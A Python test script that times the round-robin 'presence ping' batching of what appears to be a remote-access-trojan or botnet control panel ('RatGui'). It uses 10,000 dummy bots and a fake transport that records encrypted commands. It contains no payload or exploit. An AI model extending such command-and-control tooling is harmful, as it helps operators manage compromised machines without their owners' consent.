"""Test presence tick behavior without starting full GUI.
Creates a Dummy RatGui-like object with device_model loaded with N devices and a
fake transport that records pings. Calls _presence_tick and reports number sent.
"""
import sys
sys.path.insert(0, '.')
from core.device_model import DeviceTableModel

class DummyTransport:
    def __init__(self):
        self.sent = []
    def send_command(self, cmd, encrypt=True):
        self.sent.append((cmd, encrypt))
        return True

class DummyGui:
    def __init__(self, n):
        self.device_model = DeviceTableModel()
        devices = []
        for i in range(n):
            ip = f"10.0.{i//256}.{i%256}"
            bot_id = f"b{i}"
            devices.append({'id': bot_id, 'ip': ip, 'hostname': f'h{i}', 'os': 'Win', 'status':'Disconnected', 'last_ping':'N/A', 'target': f"{ip}:{bot_id}"})
        self.device_model.load_devices(devices)
        self.transport = DummyTransport()
        self.presence_window = 30
        self._presence_index = 0

    def _presence_tick(self):
        import math
        total = self.device_model.device_count()
        if total == 0:
            return
        batch_size = max(1, math.ceil(total / max(1, self.presence_window)))
        for i in range(batch_size):
            idx = (self._presence_index + i) % total
            device = self.device_model.device_at(idx)
            target = device.get('target')
            self.transport.send_command({'type':'command','target':target,'action':'ping'}, encrypt=True)
        self._presence_index = (self._presence_index + batch_size) % max(1, total)

if __name__ == '__main__':
    import time
    d = DummyGui(10000)
    t0 = time.time()
    d._presence_tick()
    t1 = time.time()
    print('Sent pings:', len(d.transport.sent), 'time', t1-t0)
    # show first 3 targets
    for i in range(3):
        print(d.transport.sent[i][0])
